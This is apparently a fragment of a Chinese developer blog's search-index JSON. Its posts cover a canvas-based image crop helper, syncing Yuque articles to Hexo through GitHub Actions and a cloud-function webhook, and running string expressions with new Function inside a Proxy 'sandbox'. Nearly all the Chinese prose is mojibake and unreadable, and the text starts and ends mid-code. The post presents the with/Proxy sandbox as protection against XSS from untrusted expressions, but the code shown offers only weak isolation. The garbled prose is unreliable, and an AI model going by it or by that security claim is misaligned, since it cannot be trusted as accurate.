&amp;.point-sw &#123; border-left: 3px solid #fff; &#125; &amp;.point-ne, &amp;.point-se &#123; border-right: 3px solid #fff; &#125; &amp;.point-sw, &amp;.point-se &#123; border-bottom: 3px solid #fff; &#125; &#125; .cropper-view-box &#123; outline-color: #fff; &#125; .cropper-dashed &#123; border-style: solid; opacity: 1; &#125; &#125;&#125; é—®é¢˜ è·å–è£åˆ‡åå›¾ç‰‡ blob å›¾ç‰‡è£åˆ‡ï¼Œéœ€è¦è·å–è£åˆ‡å›¾ç‰‡çš„ blob ä¸Šä¼ åˆ° CDNï¼ŒCropperjs æä¾›äº†è·å– blob çš„æ–¹æ³•ï¼š 1cropper.getCroppedCanvas().toBlob((blob) =&gt; &#123;&#125;) ä½†æ˜¯åœ¨æˆ‘ä»¬ä¸šåŠ¡çš„åœºæ™¯ä¸‹ï¼ŒåŒæ—¶ä¼šå­˜åœ¨ä¸¤ä¸ªè£åˆ‡æ¡†åˆ†åˆ«ç”¨æ¥è£åˆ‡ã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€ï¼Œç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªå›¾ç‰‡ï¼Œä¹Ÿå°±æ˜¯è¯´æ›¿æ¢å›¾ç‰‡ä¼šåŒæ—¶æ›¿æ¢ã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€çš„å›¾ç‰‡ã€‚è¿™å°±å¯¼è‡´äº†æ›¿æ¢å›¾ç‰‡åï¼Œåªæœ‰å½“å‰æ¿€æ´»çš„ tab ä¸‹çš„ cropper è°ƒç”¨ getCroppedCanvas æ‰èƒ½è·å–åˆ°æ›¿æ¢å›¾ç‰‡åçš„æ•°æ®ï¼Œæ²¡æœ‰æ¿€æ´»çš„ tab ä¸‹è¿˜æ˜¯è·å–æ—§å›¾ç‰‡çš„æ•°æ®ã€‚ å¤ç°è·¯å¾„ï¼šé™¤éåœ¨æäº¤å‰ï¼Œæ‰‹åŠ¨åˆ‡æ¢åˆ°ç§»åŠ¨ç«¯çš„ tabï¼Œä¸ç„¶è¯¥é—®é¢˜ä¼šä¸€ç›´å­˜åœ¨ï¼Œè¿™æ˜¯ cropperjs å†…éƒ¨å®ç°çš„é—®é¢˜ï¼Œæˆ‘ä»¬ä¸èƒ½è¦æ±‚ç”¨æˆ·å¤šè¿™ä¹ˆä¸€ä¸ªæ— æ„ä¹‰çš„æ­¥éª¤ï¼Œå› æ­¤æˆ‘ä»¬è‡ªå·±å®ç° ã€ŒgetCroppedCanvasã€æ–¹æ³•ï¼Œä¸ç”¨ cropperjs æš´éœ²çš„æ–¹æ³• 1234567891011121314151617181920212223242526272829// ä½¿ç”¨ canvas è£åˆ‡å›¾ç‰‡export const cropImage = (source: string, options: Options) =&gt; &#123; const &#123; width, height, x, y &#125; = options; const canvas = document.createElement(&quot;canvas&quot;); const context = canvas.getContext(&quot;2d&quot;)!; const image = new Image(); image.src = source; image.crossOrigin = &quot;anonymous&quot;; return new Promise&lt;HTMLCanvasElement&gt;((resolve) =&gt; &#123; image.onload = () =&gt; &#123; const [px, py, pw, ph] = [ inRange(x, 0, image.width) ? x : 0, inRange(y, 0, image.height) ? y : 0, inRange(width, 0, image.width) ? width : image.width, inRange(height, 0, image.height) ? height : image.height, ].map((param) =&gt; Math.floor(normalizeDecimalNumber(param))); canvas.width = pw; canvas.height = ph; context.imageSmoothingEnabled = true; context.imageSmoothingQuality = &quot;low&quot;; context.drawImage(image, px, py, pw, ph, 0, 0, pw, ph); context.restore(); resolve(canvas); &#125;; &#125;);&#125;;"},{"title":"è¯­é›€åŒæ­¥åˆ° Github Hexo","path":"/2023/01/31/yuque/è¯­é›€åŒæ­¥åˆ° Github Hexo/","content":"èƒŒæ™¯æˆ‘çš„åšå®¢éƒ½æ˜¯ç”¨ Hexo åœ¨æœ¬åœ°å†™å®Œï¼Œæäº¤ä¸ª commit åˆ° Githubï¼Œè§¦å‘ Github Action è‡ªåŠ¨éƒ¨ç½²åˆ° Github Page ä¸Šã€‚é™¤äº†ç”¨ Vscode å†™ Markdown æœ‰ç‚¹éš¾å—å¤–ï¼Œå…¶å®ƒåœ°æ–¹è¿˜å¥½ï¼Œè‡³äºä¸ºä»€ä¹ˆä¸€å®šè¦ç”¨ Hexo + Github çš„ç»„åˆï¼Œç™½å«– Github çš„æœåŠ¡å™¨å®ƒä¸é¦™å—ï¼Ÿ ä½†æ˜¯ï¼Œæœ€è¿‘ä½“éªŒäº†ä¸‹è¯­é›€ï¼Œå‘ç°ä»–çš„æ–‡æœ¬ç¼–è¾‘å™¨è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œå†™æ–‡æ¡£å¾ˆæ˜¯ä¸æ»‘ï¼Œæ­£å¥½åœ¨ Github ä¸Šå‘ç°äº†ä¸ªé¡¹ç›® - https://github.com/x-cold/yuque-hexoï¼Œå¯ä»¥å°†è¯­é›€çš„æ–‡ç« åŒæ­¥åˆ° Hexo ä¸­ï¼Œæ˜¯æ—¶å€™æ”¹å˜ä¸‹åšå®¢å†™ä½œæµç¨‹äº†ã€‚ä¸‹é¢å°±è®°å½•äº†æ•´ä¸ªè¿ç§»è¿‡ç¨‹ã€‚ å®‰è£…åŠé…ç½® yuque-hexoåœ¨ hexo é¡¹ç›®çš„æ ¹ç›®å½•ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå®‰è£… yuque-hexoï¼š 1yarn add yuque-hexo -D 1. æ–°å¢é…ç½®ï¼š123456789101112131415161718192021&#123; &quot;yuqueConfig&quot;: &#123; &quot;postPath&quot;: &quot;source/_posts/yuque&quot;, &quot;cachePath&quot;: &quot;yuque.json&quot;, &quot;mdNameFormat&quot;: &quot;title&quot;, &quot;adapter&quot;: &quot;hexo&quot;, &quot;concurrency&quot;: 5, &quot;baseUrl&quot;: &quot;https://www.yuque.com/api/v2&quot;, &quot;login&quot;: &quot;bijinfeng-fyjgs&quot;, &quot;repo&quot;: &quot;blog&quot;, &quot;onlyPublished&quot;: true, &quot;onlyPublic&quot;: false, &quot;imgCdn&quot;: &#123; &quot;concurrency&quot;: 0, &quot;imageBed&quot;: &quot;upyun&quot;, &quot;enabled&quot;: true, &quot;bucket&quot;: &quot;xxxx&quot;, &quot;prefixKey&quot;: &quot;yuque&quot; &#125; &#125;&#125; yuqueConfig ä¸­æ¯ä¸ªå­—æ®µçš„ä½œç”¨åœ¨ yuque-hexo çš„ README ä¸­éƒ½æœ‰è¯´æ˜ï¼Œæˆ‘è¿™é‡ŒæŒ‘å‡ ä¸ªé‡ç‚¹çš„è¯´ä¸‹ï¼š login - ä¸ªäººè·¯å¾„ repo - çŸ¥è¯†åº“è·¯å¾„ 2. æ–°å¢è„šæœ¬è¿™äº›è„šæœ¬ä¸»è¦ç”¨åœ¨åé¢çš„ Github Action ä¸­ï¼Œå½“ç„¶ä¹Ÿæ–¹ä¾¿æœ¬åœ°è°ƒè¯•ä½¿ç”¨ 1234567&#123; &quot;scripts&quot;: &#123; &quot;clean:yuque&quot;: &quot;yuque-hexo clean&quot;, &quot;sync&quot;: &quot;yuque-hexo sync&quot;, &quot;reset&quot;: &quot;npm run clean:yuque &amp;&amp; npm run sync&quot; &#125;&#125; é…ç½® Github Actionåœ¨ä¿®æ”¹ Github Action é…ç½®æ–‡ä»¶å‰ï¼Œæˆ‘ä»¬å…ˆéœ€è¦è·å–å‡ ä¸ª Tokenï¼š YUQUE_TOKEN æ–°å¢æˆ–ä½¿ç”¨ç°æœ‰çš„ Tokenï¼ŒToken ç»™ä¸ªè¯»å–æƒé™å°±è¡Œäº† SECRET_ID &#x2F; SECRET_KEY å›¾åºŠç›¸å…³çš„å¯†é’¥ï¼Œæˆ‘ç”¨çš„æ˜¯åˆæ‹äº‘ï¼Œéœ€è¦æ“ä½œå‘˜çš„è´¦å·å’Œå¯†ç ï¼ˆå¯†ç å¿˜äº†çš„è¯ï¼Œç‚¹å‡»ç¼–è¾‘æŒ‰é’®ï¼Œé‡æ–°ç”Ÿæˆä¸ªï¼‰ åœ¨ Github é¡¹ç›®çš„ Setting ä¸­æ–°å¢ä¸‰ä¸ªç¯å¢ƒå˜é‡ ä¸Šé¢çš„å˜é‡éƒ½å‡†å¤‡å¥½åï¼Œæ¥åˆ° hexo é¡¹ç›®çš„ .github&#x2F;workflows ç›®å½•ï¼Œæ–°å¢ä¸ª deploy.yml æ–‡ä»¶: 123456789101112131415161718192021222324252627282930313233343536name: Build and Deployon: push: branches: - masterjobs: build-and-deploy: environment: github-pages env: yuque_token: $&#123;&#123; secrets.YUQUE_TOKEN &#125;&#125; secret_id: $&#123;&#123; secrets.SECRET_ID &#125;&#125; secret_key: $&#123;&#123; secrets.SECRET_KEY &#125;&#125; runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@master with: submodules: true - name: Install Dependencies run: yarn install - name: Sync Yuque run: YUQUE_TOKEN=$&#123;&#123; env.yuque_token &#125;&#125; SECRET_ID=$&#123;&#123; env.secret_id &#125;&#125; SECRET_KEY=$&#123;&#123; env.secret_key &#125;&#125; yarn sync - name: Generate run: yarn build - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: $&#123;&#123; secrets.ACCESS_TOKEN &#125;&#125; publish_dir: ./public æˆ–è€…ä½ çš„é¡¹ç›®ä¸­åŸæœ¬å°±æœ‰ Action çš„é…ç½®ï¼Œç°åœ¨åªéœ€è¦å¢åŠ  yuque-hexo çš„ç›¸å…³é…ç½®å°±è¡Œï¼š æ¶ˆè´¹ä¸Šé¢è®¾ç½®çš„ç¯å¢ƒå˜é‡ æ³¨æ„ environment å­—æ®µå¿…é¡»å’Œä½ åœ¨ Github Setting ä¸­é…ç½®çš„ Environments å­—æ®µå¯¹åº”ä¸Š 12345environment: github-pages env: yuque_token: $&#123;&#123; secrets.YUQUE_TOKEN &#125;&#125; secret_id: $&#123;&#123; secrets.SECRET_ID &#125;&#125; secret_key: $&#123;&#123; secrets.SECRET_KEY &#125;&#125; åœ¨è¿è¡Œ hexo generate ä¹‹å‰ï¼Œå…ˆåŒæ­¥è¯­é›€çš„æ–‡ç«  12- name: Sync Yuque run: YUQUE_TOKEN=$&#123;&#123; env.yuque_token &#125;&#125; SECRET_ID=$&#123;&#123; env.secret_id &#125;&#125; SECRET_KEY=$&#123;&#123; env.secret_key &#125;&#125; yarn sync åˆ°è¿™é‡Œ yueque-hexo çš„é…ç½®å·¥ä½œå°±å®Œæˆäº†ï¼Œä¿å­˜ï¼Œæäº¤ commit åˆ° GitHub ä¸Šè§¦å‘ Actionï¼Œå¦‚æœä¸€åˆ‡é¡ºåˆ©çš„è¯è¯­é›€çš„æ–‡ç« å°±ä¼šåŒæ­¥è¿‡æ¥ã€‚ ä¸»åŠ¨åŒæ­¥ä¸Šé¢çš„åŠ¨ä½œå®Œæˆåï¼Œæˆ‘ä»¬è™½ç„¶èƒ½å¤ŸåŒæ­¥è¯­é›€çš„æ–‡ç« ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨è¯­é›€å†™å®Œæ–‡ç« åï¼Œè¿˜éœ€è¦åˆ° github ä¸Šæ‰‹åŠ¨è§¦å‘ä¸‹ Actionï¼Œä½“éªŒè¿˜æ˜¯ä¸å¤Ÿå®Œç¾ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªæ–¹æ¡ˆï¼š å®šä¹‰ä»»åŠ¡ç»™ Action æ·»åŠ ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œåœ¨æ¯å¤©çš„ 2:00 åŒæ­¥ä¸€æ¬¡è¯­é›€ 123on: schedule: - cron: &quot;0 2 * * *&quot; webhook åœ¨è¯­é›€å†™å®Œæ–‡ç« åï¼Œè‡ªåŠ¨è§¦å‘ä¸ª webhookï¼Œå¯åŠ¨ Github Action åŒæ­¥æ–‡ç«  ä½¿ç”¨ API è¿œç¨‹è§¦å‘ Github Action ç°åœ¨ Action åªèƒ½åœ¨æäº¤ commit åè§¦å‘ï¼Œæ–°å¢ä¸ªé…ç½®ï¼Œè®© Action æ”¯æŒè¢« api è§¦å‘ï¼š 123456789on: push: branches: - master # å…è®¸å¤–éƒ¨ä»“åº“äº‹ä»¶è§¦å‘ repository_dispatch: types: # è¿™é‡Œçš„å€¼éœ€è¦å’Œä¸‹æ–‡çš„äº‘å‡½æ•°çš„event_typeä¿æŒä¸€è‡´ - webhook è®¿é—®é“¾æ¥é¡µé¢ https://github.com/settings/tokens/new ç”³è¯·ä¸€ä¸ª Tokenï¼Œéœ€è¦å‹¾é€‰ repo æƒé™ã€‚ API è°ƒç”¨æ ¼å¼ 12345curl -X POST https://api.github.com/repos/:owner/:repo/dispatches \\ -H &quot;Accept: application/vnd.github.everest-preview+json&quot; \\ -H &quot;Authorization: token TRIGGER_TOKEN&quot; \\ --data &#x27;&#123;&quot;event_type&quot;: &quot;TRIGGER_EVENT&quot;&#125;&#x27; å…¶ä¸­ï¼Œowner æ˜¯ç”¨æˆ·åï¼Œrepo æ˜¯ä»“åº“åï¼Œ TRIGGER_TOKEN æ˜¯ä¸Šé¢ç”³è¯·çš„ Token å‡­è¯ï¼ŒTRIGGER_EVENT æ˜¯è‡ªå®šä¹‰çš„äº‹ä»¶åã€‚ è‹¥æ˜¯è¯­é›€æ”¯æŒè‡ªå®šä¹‰ webhook æ ¼å¼ï¼Œé‚£ä¹ˆæœ¬æ–‡åˆ°è¿™é‡Œå°±è¦ç»“æŸäº†ï¼Œå¯æƒœå¤©å…¬ä¸ä½œç¾ï¼Œè¯­é›€åªæ”¯æŒé…ç½®ä¸ªæ¥å£ URLã€‚é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦å€ŸåŠ©äº‘å‡½æ•°æ¥å€’ä¸€æ‰‹äº†ï¼Œä»£ç†åçš„è°ƒç”¨è·¯å¾„å˜æˆï¼šè¯­é›€ webhook -&gt; äº‘å‡½æ•° -&gt; gtihub apiã€‚ äº‘å‡½æ•° æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯è…¾è®¯äº‘å‡½æ•°ï¼Œå…¶å®ƒäº‘æœåŠ¡å•†çš„äº‘å‡½æ•°åªèƒ½è‡ªå·±æ¢ç´¢äº†ã€‚ æ–°å»ºä¸ªäº‘å‡½æ•°ï¼Œæˆ‘ä»¬åªè¦åšä¸ªæ¥å£è½¬å‘ï¼Œä¸ç”¨é‚£ä¹ˆéº»çƒ¦å°±ä¸ç”¨æ¨¡æ¿äº†ï¼ˆä½œä¸ºå‰ç«¯ er å½“ç„¶é¦–é€‰ nodeï¼‰ï¼š ä¸‹é¢ç¼–è¾‘äº‘å‡½æ•°: 123456789101112131415161718192021222324252627282930&quot;use strict&quot;;const request = require(&quot;request&quot;);exports.main_handler = async (event, context) =&gt; &#123; const res = await new Promise((resolve, reject) =&gt; &#123; request( &#123; url: &quot;https://api.github.com/repos/:owner/:repo/dispatches&quot;, method: &quot;POST&quot;, json: true, headers: &#123; &quot;User-Agent&quot;: &quot;curl/7.52.1&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, Authorization: &quot;token xxxxx&quot;, Accept: &quot;application/vnd.github.everest-preview+json&quot;, &#125;, body: &#123; event_type: &quot;webhook&quot; &#125;, &#125;, function (error, response, body) &#123; if (response.status_code == 204) &#123; resolve(response); &#125; else &#123; reject(error); &#125; &#125; ); &#125;); return res;&#125;; è§¦å‘å™¨è®¾ç½®ï¼Œè§¦å‘æ–¹å¼é€‰æ‹©ã€ŒAPI ç½‘å…³è§¦å‘ã€ï¼Œå…¶å®ƒé»˜è®¤ï¼š åˆ›å»ºæˆåŠŸåï¼Œè…¾è®¯äº‘ä¼šæä¾›ä¸ªå…¬ç½‘è®¿é—®è·¯å¾„ï¼Œå°†å…¶é…ç½®åˆ°çŸ¥è¯†åº“çš„ã€Œæ¶ˆæ¯æ¨é€ã€è®¾ç½®ä¸­ï¼š å‘å¸ƒæ–‡ç« ç°åœ¨ï¼Œåœ¨å‘å¸ƒå’Œæ›´æ–°æ–‡ç« åï¼Œå³å¯è§¦å‘ Actionã€‚ æ³¨æ„äº‹é¡¹ ä¸è¦å¼€å¯è‡ªåŠ¨å‘å¸ƒï¼Œå¦åˆ™æ— æ³•è§¦å‘ webhook"},{"title":"JS - å­—ç¬¦ä¸²å‡½æ•°è¡¨è¾¾å¼","path":"/2023/01/30/yuque/JS - å­—ç¬¦ä¸²å‡½æ•°è¡¨è¾¾å¼/","content":"æœ€è¿‘åœ¨åšä¸€ä¸ªéœ€è¦ï¼Œéœ€è¦å®ç°ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„â€œå‡½æ•°è¡¨è¾¾å¼â€ï¼Œä»¥åŒæ‹¬å·â€{{â€¦}}â€ä¸ºè¯­æ³•ç‰¹å¾ã€‚ä¾‹å¦‚ï¼š 123&#123;\ttitleï¼š&quot;&#123;&#123;formData.x.y === &#x27;us&#x27; ? &#x27;ç¾å…ƒ&#x27;:&#x27;äººæ°‘å¸&#x27;&#125;&#125;&quot;&#125; å¹¶ä¸”å‡½æ•°è¡¨è¾¾å¼å†…ç½®äº†ä¸€äº›å…³é”®è¯ï¼š $self - ä»£è¡¨å½“å‰å­—æ®µå®ä¾‹ï¼Œç”¨æ¥è·å–å½“å‰å­—æ®µçš„å€¼å’Œ schema é…ç½® $values - ä»£è¡¨æ•´ä¸ªè¡¨å•æ•°æ® $form - ä»£è¡¨å½“å‰ Form å®ä¾‹ï¼Œå¯ä»¥ç”¨æ¥è§¦å‘è¡¨å•æ ¡éªŒç­‰æ“ä½œ $deps - è·å– dependencies ä¸­ä¾èµ–é¡¹çš„å€¼ï¼Œå’Œ dependencies é¡ºåºä¸€è‡´ $fetch - ä½¿ç”¨å°è£…çš„ request æ–¹æ³•ï¼Œå‘é€ http è¯·æ±‚ ä½¿ç”¨äº†å…³é”®è¯çš„è¡¨è¾¾å¼å¦‚ä¸‹ï¼š 123&#123; select_options: &quot;&#123;&#123;$self.select_options.map(item =&gt; (&#123; ...item, disabled: $deps[0].map(it =&gt; it.bank_card_usage).includes(item.value) &#125;))&#125;&#125;&quot;;&#125; å‡½æ•°è¡¨è¾¾å¼å¯èƒ½ç”±åç«¯ä¸‹å‘æˆ–è€…ç”¨æˆ·è¾“å…¥ï¼Œå› æ­¤ä¸ºé˜²æ­¢ XSS æ³¨å…¥ï¼Œå‡½æ•°è¡¨è¾¾å¼çš„ä½œç”¨åŸŸéœ€è¦é™åˆ¶ä¸‹ã€‚ å®ç°new Function è¯­æ³• å¼•ç”¨è‡ªï¼š å®ç°å‡½æ•°è¡¨è¾¾å¼ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå¤ä¹ ä¸‹ new Function è¯­æ³•ï¼š 1let func = new Function([arg1, arg2, ...argN], functionBody); æœ€åä¸€ä¸ªå‚æ•°ä¸€å®šæ˜¯å‡½æ•°ä½“ï¼Œå…¶ä½™å‚æ•°éƒ½ä½œä¸ºä¼ ç»™å‡½æ•°ä½“çš„å‚æ•°ã€‚ä¾‹å¦‚ï¼š 123let sum = new Function(&quot;a&quot;, &quot;b&quot;, &quot;return a + b&quot;);console.log(sum(1, 2)); // ç»“æœæ˜¯ 3 å¹³å¸¸è¿›è¡Œ JS æˆ–è€… Node.js å¼€å‘çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰ä»»ä½•ç†ç”±ä½¿ç”¨ new Function æ„é€ å‡½æ•°çš„ï¼Œå› ä¸ºæ²¡å¿…è¦ï¼Œç›´æ¥ä½¿ç”¨ function æˆ–è€… () &#x3D;&gt; {} ç®­å¤´å‡½æ•°å†™æ³•å°±å¥½äº†ã€‚ é‚£æ˜¯ä¸æ˜¯è¡¨ç¤º new Function è¯­æ³•æ˜¯ä¸ªé¸¡è‚‹ç‰¹æ€§å‘¢ï¼Ÿ ä¸ï¼ç»ä¸æ˜¯ï¼ new Function è¯­æ³•æœ‰ä¸ªç‰¹åˆ«å‰å®³çš„ç‰¹æ€§ï¼Œä½¿å…¶æˆä¸º JavaScript è¿™é—¨è¯­è¨€ä¸­æ— å¯æ›¿ä»£çš„é‡è¦è§’è‰²ã€‚ã€‚ ä»€ä¹ˆç‰¹æ€§å‘¢ï¼Ÿ é‚£å°±æ˜¯å‡½æ•°ä½“çš„æ•°æ®æ ¼å¼æ˜¯å­—ç¬¦ä¸²ï¼Œè¿™å¯æ˜¯ä¸ªä¸å¾—äº†çš„ä¸œè¥¿å•Šï¼ è§£æå‡½æ•°è¡¨è¾¾å¼åˆ©ç”¨ new Function çš„è¯­æ³•ç‰¹æ€§ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†å­—ç¬¦ä¸²å˜æˆå¯æ‰§è¡Œçš„ä»£ç ï¼š 12345const compile = (expression: string, scope = &#123;&#125;) =&gt; &#123; return new Function(&quot;$root&quot;, `with($root) &#123; return ($&#123;expression&#125;); &#125;`)( scope );&#125;; compile å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æ‰§è¡Œçš„å­—ç¬¦ä¸²è¡¨è¾¾å¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ‰§è¡Œæ—¶çš„ä½œç”¨åŸŸï¼Œå°† $self ç­‰å†…ç½®å…³é”®è¯ä¼ å…¥ scope ä¾›å‡½æ•°æ‰§è¡Œæ—¶è°ƒç”¨ã€‚ compile å®ç°æ—¶ä½¿ç”¨äº† with å…³é”®è¯ï¼Œå¸®åŠ©æˆ‘ä»¬ç®€åŒ–ä»£ç ï¼Œå¦‚æœä¸ä½¿ç”¨ with å…³é”®è¯ï¼Œscope é‡Œæ‰€æœ‰çš„å…ƒç´ éƒ½éœ€è¦ä¾æ¬¡ä¼ å…¥ new Function ä¸­ï¼š 12345const compile = (expression, scope = &#123;&#125;) =&gt; &#123; const keys = Object.keys(scope); const values = keys.map((key) =&gt; scope[key]); return new Function(...keys, `return ($&#123;expression&#125;);`)(...values);&#125;; ä¸è¿‡ï¼Œwith åœ¨æ€§èƒ½å’Œè¯­ä¹‰æ–¹é¢éƒ½æœ‰äº›é—®é¢˜ï¼ˆå…·ä½“é—®é¢˜è§ï¼šhttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/withï¼‰ï¼Œè‡³äºç”¨ä¸ç”¨ï¼Œè‡ªå·±è€ƒè™‘å§ é™åˆ¶ä½œç”¨åŸŸç°åœ¨å­—ç¬¦ä¸²å¾—ä»¥æ‰§è¡Œäº†ï¼Œæ¥ä¸‹æ¥éœ€è¦è§£å†³çš„å°±æ˜¯å‡½æ•°çš„ä½œç”¨åŸŸé—®é¢˜äº†ã€‚ ç”± Function æ„é€ å‡½æ•°åˆ›å»ºçš„å‡½æ•°ä¸ä¼šåˆ›å»ºå½“å‰ç¯å¢ƒçš„é—­åŒ…ï¼Œå®ƒä»¬æ€»æ˜¯è¢«åˆ›å»ºäºå…¨å±€ç¯å¢ƒï¼Œå› æ­¤åœ¨è¿è¡Œæ—¶å®ƒä»¬åªèƒ½è®¿é—®å…¨å±€å˜é‡å’Œè‡ªå·±çš„å±€éƒ¨å˜é‡ï¼Œä¸èƒ½è®¿é—®å®ƒä»¬è¢« Function æ„é€ å‡½æ•°åˆ›å»ºæ—¶æ‰€åœ¨çš„ä½œç”¨åŸŸçš„å˜é‡ã€‚ 12345678910111213141516171819var x = 10;function createFunction1() &#123; var x = 20; return new Function(&quot;return x;&quot;); // è¿™é‡Œçš„ x æŒ‡å‘æœ€ä¸Šé¢å…¨å±€ä½œç”¨åŸŸå†…çš„ x&#125;function createFunction2() &#123; var x = 20; function f() &#123; return x; // è¿™é‡Œçš„ x æŒ‡å‘ä¸Šæ–¹æœ¬åœ°ä½œç”¨åŸŸå†…çš„ x &#125; return f;&#125;var f1 = createFunction1();console.log(f1()); // 10var f2 = createFunction2();console.log(f2()); // 20 å› æ­¤ï¼Œå¦‚æœä»…ä»…æ˜¯é™åˆ¶è¡¨è¾¾å¼è®¿é—®åˆ›å»ºæ—¶æ‰€åœ¨çš„ä½œç”¨åŸŸçš„å˜é‡ï¼Œnew Function å°±è¶³å¤Ÿäº†ï¼Œå¦‚æœè¿˜æƒ³è¦é™åˆ¶è®¿é—®å…¨å±€ä½œç”¨åŸŸï¼Œé‚£ä¹ˆå°±è¦å®ç°ä¸€ä¸ªæ²™ç®±äº†ã€‚ æ²™ç®± å¼•ç”¨è‡ªï¼š ä»€ä¹ˆæ˜¯æ²™ç®±ï¼Ÿåœ¨è®¡ç®—æœºå®‰å…¨ä¸­ï¼Œæ²™ç®±ï¼ˆSandboxï¼‰æ˜¯ä¸€ç§ç”¨äºéš”ç¦»æ­£åœ¨è¿è¡Œç¨‹åºçš„å®‰å…¨æœºåˆ¶ï¼Œé€šå¸¸ç”¨äºæ‰§è¡Œæœªç»æµ‹è¯•æˆ–ä¸å—ä¿¡ä»»çš„ç¨‹åºæˆ–ä»£ç ï¼Œå®ƒä¼šä¸ºå¾…æ‰§è¡Œçš„ç¨‹åºåˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„æ‰§è¡Œç¯å¢ƒï¼Œå†…éƒ¨ç¨‹åºçš„æ‰§è¡Œä¸ä¼šå½±å“åˆ°å¤–éƒ¨ç¨‹åºçš„è¿è¡Œã€‚ å¸¸è§çš„æ²™ç®±åº”ç”¨åœºæ™¯ï¼š æ‰§è¡Œ JSONP è¯·æ±‚å›æ¥çš„å­—ç¬¦ä¸²æ—¶æˆ–å¼•å…¥ä¸çŸ¥åç¬¬ä¸‰æ–¹ JS åº“æ—¶ï¼Œå¯èƒ½éœ€è¦åˆ›é€ ä¸€ä¸ªæ²™ç®±æ¥æ‰§è¡Œè¿™äº›ä»£ç ã€‚ Vue æ¨¡æ¿è¡¨è¾¾å¼çš„è®¡ç®—æ˜¯è¿è¡Œåœ¨ä¸€ä¸ªæ²™ç›’ä¹‹ä¸­çš„ï¼Œåœ¨æ¨¡æ¿å­—ç¬¦ä¸²ä¸­çš„è¡¨è¾¾å¼åªèƒ½è·å–éƒ¨åˆ†å…¨å±€å¯¹è±¡ï¼Œè¿™ä¸€ç‚¹å®˜æ–¹æ–‡æ¡£æœ‰æåˆ°ï¼Œè¯¦æƒ…å¯å‚é˜…æºç ã€‚ åœ¨çº¿ä»£ç ç¼–è¾‘å™¨ï¼Œå¦‚ CodeSanbox ç­‰åœ¨çº¿ä»£ç ç¼–è¾‘å™¨åœ¨æ‰§è¡Œè„šæœ¬æ—¶éƒ½ä¼šå°†ç¨‹åºæ”¾ç½®åœ¨ä¸€ä¸ªæ²™ç®±ä¸­ï¼Œé˜²æ­¢ç¨‹åºè®¿é—®&#x2F;å½±å“ä¸»é¡µé¢ã€‚ å¤Ÿç”¨çš„æ²™ç®±å®ç°ï¼šProxy ä¸­çš„ get å’Œ set æ–¹æ³•åªèƒ½æ‹¦æˆªå·²å­˜åœ¨äºä»£ç†å¯¹è±¡ä¸­çš„å±æ€§ï¼Œå¯¹äºä»£ç†å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„å±æ€§è¿™ä¸¤ä¸ªé’©å­æ˜¯æ— æ„ŸçŸ¥çš„ã€‚å› æ­¤è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ Proxy.has() æ¥æ‹¦æˆª with ä»£ç å—ä¸­çš„ä»»æ„å˜é‡çš„è®¿é—®ï¼Œå¹¶è®¾ç½®ä¸€ä¸ªç™½åå•ï¼Œåœ¨ç™½åå•å†…çš„å˜é‡å¯ä»¥æ­£å¸¸èµ°ä½œç”¨åŸŸé“¾çš„è®¿é—®æ–¹å¼ï¼Œä¸åœ¨ç™½åå•å†…çš„å˜é‡ä¼šç»§ç»­åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ²™ç®±è‡ªè¡Œç»´æŠ¤çš„ä¸Šä¸‹æ–‡å¯¹è±¡ä¸­ï¼Œå­˜åœ¨åˆ™æ­£å¸¸è®¿é—®ï¼Œä¸å­˜åœ¨åˆ™ç›´æ¥æŠ¥é”™ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344const withedCode = (code: string) =&gt; &#123; return new Function(&quot;$root&quot;, `with($root) &#123; return ($&#123;code&#125;); &#125;`);&#125;;// å¯è®¿é—®å…¨å±€ä½œç”¨åŸŸçš„ç™½åå•åˆ—è¡¨const access_white_list = [&quot;Math&quot;, &quot;Date&quot;];const Sandbox = (code: string, scope = &#123;&#125;) =&gt; &#123; // æ‰§è¡Œä¸Šä¸‹æ–‡å¯¹è±¡çš„ä»£ç†å¯¹è±¡ const scopeProxy = new Proxy(scope, &#123; has: (target, prop) =&gt; &#123; // has å¯ä»¥æ‹¦æˆª with ä»£ç å—ä¸­ä»»æ„å±æ€§çš„è®¿é—® if (access_white_list.includes(prop)) &#123; // åœ¨å¯è®¿é—®çš„ç™½åå•å†…ï¼Œå¯ç»§ç»­å‘ä¸ŠæŸ¥æ‰¾ return target.hasOwnProperty(prop); &#125; if (!target.hasOwnProperty(prop)) &#123; throw new Error(`Invalid expression - $&#123;prop&#125;! You can not do that!`); &#125; return true; &#125;, &#125;); withedCode(code).call(scopeProxy, scopeProxy);&#125;;// æ‰§è¡Œä¸Šä¸‹æ–‡å¯¹è±¡const scope = &#123; func: (variable) =&gt; &#123; console.log(variable); &#125;, foo: &quot;foo&quot;,&#125;;// å¾…æ‰§è¡Œç¨‹åºconst code = ` Math.random() location.href = &#x27;xxx&#x27; func(foo)`;console.log(Sandbox(code, scope)); æœ€ç»ˆå®ç°ç‰ˆæœ¬12345678910111213141516171819202122232425262728293031323334353637const scope = &#123; 